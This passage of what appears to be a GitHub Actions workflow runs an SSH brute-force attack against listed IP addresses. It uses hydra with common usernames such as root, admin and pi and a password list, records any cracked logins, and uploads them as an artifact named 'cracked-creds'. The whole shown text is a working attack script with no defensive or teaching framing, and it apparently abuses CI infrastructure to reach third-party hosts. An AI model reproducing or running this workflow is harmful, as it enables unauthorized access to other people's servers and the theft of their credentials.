          45.33.32.98:22
          45.33.32.99:22
          EOF
          echo "Total targets: $(wc -l < targets.txt)"

      - name: Brute force SSH
        run: |
          USERNAMES=("root" "admin" "user" "ubuntu" "pi")
          RESULT_FILE="found.txt"
          > $RESULT_FILE

          while read target; do
            ip=$(echo $target | cut -d: -f1)
            port=$(echo $target | cut -d: -f2)
            for user in "${USERNAMES[@]}"; do
              echo "[*] Trying $user@$ip:$port"
              hydra -l "$user" -P pass.txt -s "$port" -t 64 -f -o hydra.log "$ip" ssh > /dev/null 2>&1
              if grep -q "host: $ip.*password:" hydra.log; then
                pass=$(grep "host: $ip.*password:" hydra.log | head -1 | awk -F 'password: ' '{print $2}')
                echo "✅ SUCCESS: $ip:$port | $user | $pass" | tee -a $RESULT_FILE
                # اگه یافت شد، کل workflow متوقف شود
                exit 0
              fi
            done
          done < targets.txt

          echo "No credentials found in this batch."
          exit 1

      - name: Upload credentials
        if: success()
        uses: actions/upload-artifact@v4
        with:
          name: cracked-creds
          path: found.txt
